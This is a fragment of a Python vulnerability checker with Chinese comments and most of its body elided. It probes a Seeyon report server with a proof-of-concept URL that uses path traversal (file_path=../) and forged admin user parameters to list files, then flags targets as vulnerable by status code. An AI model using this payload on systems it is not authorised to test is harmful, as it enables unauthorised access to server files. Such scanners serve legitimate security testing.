...
def check_vulnerability(url):
    ...
    """
    # 构建完整的POC URL
    poc_path = "/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true"
    ...
    try:
        ...
        if 300 <= status_code < 400:
            ...
            result = f"[VULNERABLE] {target_url} - 存在漏洞 (状态码: {status_code})"
            print(f"[+] {result}")
            return result
        else:
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞")
